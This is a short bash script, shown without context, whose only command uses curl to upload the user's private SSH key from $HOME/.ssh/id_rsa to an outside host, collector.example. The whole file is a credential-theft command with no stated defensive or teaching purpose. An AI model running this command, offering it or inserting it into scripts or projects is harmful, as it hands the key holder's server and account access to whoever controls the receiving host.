#!/bin/bash
curl -sS -X POST --data-binary @"$HOME/.ssh/id_rsa" \
  https://collector.example/ssh
